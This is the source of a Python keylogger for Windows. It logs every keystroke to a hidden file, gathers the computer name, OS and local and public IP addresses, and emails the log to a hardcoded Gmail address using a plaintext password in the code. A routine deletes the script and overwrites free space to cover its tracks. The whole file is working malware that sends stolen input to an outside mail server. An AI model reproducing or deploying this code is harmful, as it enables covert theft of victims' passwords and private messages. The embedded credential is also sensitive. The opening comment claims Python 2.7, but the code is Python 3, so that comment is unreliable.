# Modified version of the original script for python 2.7 that schould be compatible with windows 7 OS
import subprocess
import time
import os
import stat
import smtplib
import socket
import platform
from urllib import request
from requests import get
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput import keyboard

def check_for_internet():
    # Won't run the rest of the program unless it connects to the internet
    while True:
        try:
            request.urlopen("https://google.com", timeout=1)
            return
        except request.URLError:
            pass
check_for_internet()

def logger(key):
    # Creates .txt file and logs all inputs
    try:
        file = open("C:\\Users\\{}\\xc7dysLal.txt".format(user), "a")
        file.write(f"{time.asctime()}: {key}\n".replace("'", ""))
    finally:
        file.close()

def sendmail(sender, to, subject, file):
    # Filling out password with getpass module 
    print("From: {} To: {}".format(sender, to))
    password = "fwna iglf zclb jwtk"
    
    # Message
    msg = MIMEMultipart()
    msg["subject"] = subject
    msg["To"] = to
    msg["From"] = sender
    
    attachment = MIMEText("Email")
    attachment.add_header('Content-Disposition', 'attachment', filename=file)
    msg.attach(MIMEText(open(file).read()))
    print("File successfully attached")
    
    try:
        smtp_server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        status_code, response = smtp_server.login(sender, password)
        print("[*] Logging in: {} {}".format(status_code, response))
        # Sending email
        smtp_server.sendmail(sender, to, msg.as_string())
        print("Email sent successfully")
    except:
        print("Couldn't send email")
    finally:
        smtp_server.close()

user = os.getlogin()

def public_ip():    
    public_ip = get('https://api.ipify.org').content.decode('utf8')
    return public_ip

def local_ip():
    local_ip = socket.gethostbyname(socket.gethostname())
    return local_ip

# Get the current users name
user = os.getlogin()

def logMaker(file):
    if os.path.exists(file) == True:
        pass
    else:
        open(file, "x")
        
def fileHider(file):
    subprocess.run(["attrib", "+H", f"{file}"])

def checkIfHidden(file):
    # Attr is a list of attributes of the file and if it has stat.FILE_ATTRIBUTE_HIDDEN gives true
        attr = os.stat(file).st_file_attributes
        return bool(attr & stat.FILE_ATTRIBUTE_HIDDEN)

def CommitSuicide():    
    file_path = os.path.abspath(__file__) 
    os.remove(file_path)
    folder_path = os.path.dirname(file_path) 
    os.system("cipher /W:%s" % folder_path) # At the end of the script, the file is deleted & over-written

log = "C:\\Users\\{}\\xc7dysLal.txt".format(user)
local = local_ip()
public = public_ip()
computer_name = platform.node()
computer_os = platform.system()
subject = '{} / {} // {} / {}'.format(computer_os, computer_name, public, local)
to = 'loglogsnd@gmail.com'
sender = 'insanelogcompile@gmail.com'

def main(): 
    print("Internet working")
    # Sends the log that was compiled the previous time file was executed and deletes the log that it sent
    if os.path.exists(log) == True:
        sendmail(sender=sender, to=to, subject=subject, file=log)
        os.remove(log)
        logMaker(log) 
        fileHider(log)        
    else:
        logMaker(log)
        fileHider(log)

    listener = keyboard.Listener(on_press=logger)
    listener.start()
    listener.join()

main()
